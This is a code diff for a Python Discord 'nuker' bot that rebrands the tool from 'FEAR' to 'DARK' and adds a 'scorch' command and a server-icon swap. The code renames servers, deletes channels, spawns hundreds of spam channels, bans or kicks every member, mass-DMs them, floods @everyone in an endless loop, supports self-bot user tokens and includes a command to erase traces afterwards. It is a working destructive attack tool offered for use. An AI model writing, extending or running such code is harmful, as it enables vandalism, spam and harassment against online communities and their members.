@@ -18,24 +18,24 @@ import platform
 init()
 
 # Configuration file path
-CONFIG_FILE = "fear_config.json"
+CONFIG_FILE = "dark_config.json"
 
 # Default configuration
 DEFAULT_CONFIG = {
     "TOKEN": "YOUR_TOKEN_HERE",
     "TOKEN_TYPE": "bot",  # or "user" for self-bot
     "PREFIX": "!",
-    "GUILD_NAMES": ["FEAR.IO DOMINATES", "NUKED BY FEAR", "GET REKT NOOBS", "FEAR WAS HERE"],
-    "CHANNEL_NAMES": ["nuked-by-fear", "get-rekt", "fear-owns-you", "discord-crashed"],
+    "GUILD_NAMES": ["DARK DOMINATES", "NUKED BY DARK", "GET REKT NOOBS", "DARK WAS HERE"],
+    "CHANNEL_NAMES": ["nuked-by-dark", "get-rekt", "dark-owns-you", "discord-crashed"],
     "SPAM_MESSAGES": [
-        "@everyone **FEAR.IO HAS TAKEN OVER** https://discord.gg/fear",
+        "@everyone **DARK HAS TAKEN OVER** https://discord.gg/dark",
         "@everyone **YOUR SERVER IS COMPROMISED** :skull:",
-        "@everyone **WAKE UP SHEEPLE** https://fear.io",
-        "@everyone **THIS IS WHAT HAPPENS WHEN YOU MESS WITH FEAR** :fire:"
+        "@everyone **WAKE UP SHEEPLE** https://dark.io",
+        "@everyone **THIS IS WHAT HAPPENS WHEN YOU MESS WITH DARK** :fire:"
     ],
-    "ROLE_NAME": "FEAR OWNED YOU",
-    "WEBHOOK_NAME": "FEAR_LOGS",
-    "REASON": "NUKED BY FEAR.IO | https://fear.io",
+    "ROLE_NAME": "DARK OWNED YOU",
+    "WEBHOOK_NAME": "DARK_LOGS",
+    "REASON": "NUKED BY DARK | https://dark.io",
     "MAX_CHANNELS": 100,
     "MAX_ROLES": 100,
     "MESSAGES_PER_CHANNEL": 200,
@@ -43,7 +43,8 @@ DEFAULT_CONFIG = {
     "RAID_MODE": False,
     "AUTO_NUKE": False,
     "ANTI_BAN": True,
-    "PROXY": None
+    "PROXY": None,
+    "ADMIN_ONLY": True
 }
 
 # ASCII Art Colors
@@ -59,8 +60,10 @@ class ArtColors:
     UNDERLINE = '\033[4m'
     END = '\033[0m'
 
-# Global session variable
+# Global variables
+bot = None
 session = None
+config = None
 
 def load_config():
     """Load or create configuration file"""
@@ -80,9 +83,9 @@ def save_config():
 def print_banner():
     """Print the awesome banner"""
     custom_fig = Figlet(font='slant')
-    banner = custom_fig.renderText('MEGA NUKE')
+    banner = custom_fig.renderText('DARK NUKE')
     print(f"{ArtColors.RED}{ArtColors.BOLD}{banner}{ArtColors.END}")
-    print(f"{ArtColors.CYAN}⚡ MEGA ULTIMATE DISCORD NUKER v5.0 {ArtColors.END}")
+    print(f"{ArtColors.CYAN}⚡ DARK MEGA HYPER ULTIMATE DISCORD NUKER v6.66 {ArtColors.END}")
     print(f"{ArtColors.YELLOW}📅 {datetime.datetime.now()}{ArtColors.END}")
     print(f"{ArtColors.MAGENTA}🐍 Python {platform.python_version()}{ArtColors.END}")
     print(f"{ArtColors.RED}☠️  Token Type: {config['TOKEN_TYPE'].upper()}{ArtColors.END}")
@@ -103,7 +106,7 @@ def termux_menu():
     while True:
         os.system('clear')
         print_banner()
-        print(f"{ArtColors.GREEN}📱 MEGA ULTIMATE MENU:{ArtColors.END}")
+        print(f"{ArtColors.GREEN}📱 DARK ULTIMATE MENU:{ArtColors.END}")
         print(f"{ArtColors.CYAN}1. Start Nuker {config['TOKEN_TYPE'].upper()} Token{ArtColors.END}")
         print(f"{ArtColors.BLUE}2. Edit Configuration{ArtColors.END}")
         print(f"{ArtColors.MAGENTA}3. View Current Config{ArtColors.END}")
@@ -186,9 +189,10 @@ def view_config():
 
 def start_bot():
     """Start the bot with current configuration"""
+    global bot, config
     os.system('clear')
     print_banner()
-    print(f"{ArtColors.GREEN}🚀 Starting MEGA Nuker {config['TOKEN_TYPE'].upper()}...{ArtColors.END}")
+    print(f"{ArtColors.GREEN}🚀 Starting DARK Nuker {config['TOKEN_TYPE'].upper()}...{ArtColors.END}")
     print(f"{ArtColors.CYAN}🛠️  Using prefix: {config['PREFIX']}{ArtColors.END}")
     print(f"{ArtColors.YELLOW}⚡ Press Ctrl+C to stop the bot{ArtColors.END}\n")
     
@@ -205,7 +209,6 @@ def start_bot():
         bot = commands.Bot(
             command_prefix=config['PREFIX'],
             intents=intents,
-            self_bot=(config['TOKEN_TYPE'] == "user"),
             help_command=None
         )
         
@@ -219,12 +222,17 @@ def start_bot():
         bot.command(name='massdm')(massdm)
         bot.command(name='destroy')(destroy)
         bot.command(name='cleanup')(cleanup)
+        bot.command(name='scorch')(scorch)
         
         # Initialize session
         asyncio.run(initialize_session())
         
-        # Run the bot
-        bot.run(config['TOKEN'], bot=(config['TOKEN_TYPE'] == "bot"))
+        # Run the bot based on token type
+        if config['TOKEN_TYPE'] == "bot":
+            bot.run(config['TOKEN'])
+        else:
+            bot.run(config['TOKEN'], bot=False)
+            
     except discord.LoginFailure:
         print(f"{ArtColors.RED}❌ Invalid token! Please check your config.{ArtColors.END}")
     except Exception as e:
@@ -239,7 +247,7 @@ async def on_ready():
     """Called when the bot is ready"""
     print_banner()
     print(f'{ArtColors.GREEN}⚡ Logged in as {bot.user.name} (ID: {bot.user.id}){ArtColors.END}')
-    print(f'{ArtColors.RED}☢️  MEGA ULTIMATE NUKE BOT ACTIVATED!{ArtColors.END}')
+    print(f'{ArtColors.RED}☢️  DARK ULTIMATE NUKE BOT ACTIVATED!{ArtColors.END}')
     print(f'{ArtColors.CYAN}🔄 Auto Nuke: {"ENABLED" if config["AUTO_NUKE"] else "DISABLED"}{ArtColors.END}')
     
     activity = discord.Game(name=f"{config['PREFIX']}nuke | {config['TOKEN_TYPE'].upper()} MODE")
@@ -254,7 +262,7 @@ async def on_ready():
 
 async def perform_nuke(guild):
     """Perform the nuke operation on a guild"""
-    print(f'{ArtColors.RED}☠️ Starting MEGA NUKE on {guild.name}{ArtColors.END}')
+    print(f'{ArtColors.RED}☠️ Starting DARK NUKE on {guild.name}{ArtColors.END}')
     
     # Step 1: Rename server
     new_name = random.choice(config['GUILD_NAMES'])
@@ -273,7 +281,7 @@ async def perform_nuke(guild):
     # Step 5: Create mass channels and start spamming
     tasks = await create_mass_channels(guild)
     
-    # Step 6: Ban all members
+    # Step 6: Ban/Kick all members
     if config['ANTI_BAN']:
         await kick_all_members(guild)
     else:
@@ -282,10 +290,13 @@ async def perform_nuke(guild):
     # Step 7: Mass DM all members
     await massdm_auto(guild)
     
+    # Step 8: Change server icon
+    await change_server_icon(guild)
+    
     # Wait for all tasks to complete
     await asyncio.gather(*tasks)
     
-    print(f'{ArtColors.RED}💥 MEGA NUKE COMPLETED ON {guild.name}!{ArtColors.END}')
+    print(f'{ArtColors.RED}💥 DARK NUKE COMPLETED ON {guild.name}!{ArtColors.END}')
 
 async def delete_all_channels(guild):
     """Delete all channels in the guild"""
@@ -325,6 +336,7 @@ async def create_mass_channels(guild):
     tasks = []
     for i in range(config['MAX_CHANNELS']):
         try:
+            # Create text channel
             channel_name = f"{random.choice(config['CHANNEL_NAMES'])}-{''.join(random.choices(string.digits, k=6))}"
             channel = await guild.create_text_channel(channel_name)
             print(f'{ArtColors.GREEN}🔥 Created channel: {channel.name}{ArtColors.END}')
@@ -340,7 +352,7 @@ async def create_mass_channels(guild):
             
             tasks.append(spam_channel(channel))
             
-            # Create voice channel too
+            # Create voice channel
             try:
                 vc_name = f"VC-{random.randint(1000,9999)}"
                 await guild.create_voice_channel(vc_name)
@@ -381,7 +393,7 @@ async def ban_all_members(guild):
     tasks = []
     for member in guild.members:
         try:
-            if member != bot.user:
+            if member != bot.user and (not config['ADMIN_ONLY'] or not member.guild_permissions.administrator):
                 tasks.append(asyncio.create_task(member.ban(reason=config['REASON'], delete_message_days=7)))
                 print(f'{ArtColors.RED}🔨 Banning member: {member.name}{ArtColors.END}')
         except Exception as e:
@@ -394,7 +406,7 @@ async def kick_all_members(guild):
     tasks = []
     for member in guild.members:
         try:
-            if member != bot.user:
+            if member != bot.user and (not config['ADMIN_ONLY'] or not member.guild_permissions.administrator):
                 tasks.append(asyncio.create_task(member.kick(reason=config['REASON'])))
                 print(f'{ArtColors.RED}👢 Kicking member: {member.name}{ArtColors.END}')
         except Exception as e:
@@ -414,10 +426,25 @@ async def massdm_auto(guild):
         except Exception as e:
             print(f'{ArtColors.YELLOW}⚠️ Failed to DM {member.name}: {e}{ArtColors.END}')
 
+async def change_server_icon(guild):
+    """Change server icon to something more... dark"""
+    try:
+        icon_urls = [
+            "https://i.imgur.com/black_square.png",
+            "https://i.imgur.com/skull_logo.jpg"
+        ]
+        async with session.get(random.choice(icon_urls)) as resp:
+            if resp.status == 200:
+                icon_data = await resp.read()
+                await guild.edit(icon=icon_data)
+                print(f'{ArtColors.BLUE}🖼️ Changed server icon{ArtColors.END}')
+    except Exception as e:
+        print(f'{ArtColors.YELLOW}⚠️ Failed to change server icon: {e}{ArtColors.END}')
+
 # Bot commands
 async def nuke(ctx):
     """The ultimate nuke command"""
-    if not ctx.author.guild_permissions.administrator and config['TOKEN_TYPE'] == "bot":
+    if config['ADMIN_ONLY'] and not ctx.author.guild_permissions.administrator and config['TOKEN_TYPE'] == "bot":
         await ctx.send("You need administrator permissions to use this command!")
         return
     
@@ -425,7 +452,7 @@ async def nuke(ctx):
 
 async def raid(ctx):
     """Spam channels without deleting everything"""
-    if not ctx.author.guild_permissions.administrator and config['TOKEN_TYPE'] == "bot":
+    if config['ADMIN_ONLY'] and not ctx.author.guild_permissions.administrator and config['TOKEN_TYPE'] == "bot":
         await ctx.send("You need administrator permissions to use this command!")
         return
     
@@ -434,20 +461,20 @@ async def raid(ctx):
 
 async def crash(ctx):
     """Crash the server with mentions"""
-    if not ctx.author.guild_permissions.administrator and config['TOKEN_TYPE'] == "bot":
+    if config['ADMIN_ONLY'] and not ctx.author.guild_permissions.administrator and config['TOKEN_TYPE'] == "bot":
         await ctx.send("You need administrator permissions to use this command!")
         return
     
     try:
         while True:
-            await ctx.send("@everyone " * 10 + "SERVER CRASHED BY FEAR.IO " * 5 + ":boom:" * 5)
+            await ctx.send("@everyone " * 10 + "SERVER CRASHED BY DARK " * 5 + ":boom:" * 5)
             await asyncio.sleep(0.1)
     except:
         pass
 
 async def massdm(ctx, *, message: str):
     """Mass DM all server members with custom message"""
-    if not ctx.author.guild_permissions.administrator and config['TOKEN_TYPE'] == "bot":
+    if config['ADMIN_ONLY'] and not ctx.author.guild_permissions.administrator and config['TOKEN_TYPE'] == "bot":
         await ctx.send("You need administrator permissions to use this command!")
         return
     
@@ -480,14 +507,21 @@ async def cleanup(ctx):
     """Clean traces after nuking"""
     try:
         for channel in ctx.guild.channels:
-            if "fear" in channel.name.lower() or "nuke" in channel.name.lower():
+            if "dark" in channel.name.lower() or "nuke" in channel.name.lower():
                 await channel.delete()
         for role in ctx.guild.roles:
-            if "fear" in role.name.lower():
+            if "dark" in role.name.lower():
                 await role.delete()
         await ctx.send("Cleaned up traces.")
     except:
         pass
+
+async def scorch(ctx):
+    """Complete annihilation with extra destruction"""
+    await ctx.send("🔥 INITIATING SCORCHED EARTH PROTOCOL 🔥")
+    await nuke(ctx)
+    await raid(ctx)
+    await massdm(ctx, message="YOUR SERVER HAS BEEN SCORCHED BY DARK")
 
 # Main execution
 if __name__ == "__main__":
